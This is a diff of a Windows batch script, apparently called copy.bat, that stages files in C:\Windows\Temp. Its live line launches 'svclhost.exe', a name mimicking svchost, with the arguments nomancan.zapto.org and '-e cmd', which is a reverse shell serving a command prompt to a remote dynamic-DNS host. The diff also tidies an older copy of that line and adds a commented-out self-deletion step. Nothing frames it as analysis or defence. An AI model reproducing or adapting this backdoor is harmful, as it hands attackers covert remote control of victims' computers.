@@ -20,9 +20,7 @@ powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Obj
 xcopy "C:\Windows\Temp\0test0" "C:\Windows\Temp" /h /i /c /k /e /r /y
 cd "C:\Windows\Temp"
 
-
-
-rem cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org 4425 -e cmd
 cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd
 
 rem rmdir /Q /S "C:\Windows\Temp\0test0"
+rem del "C:\Windows\Temp\copy.bat" /f
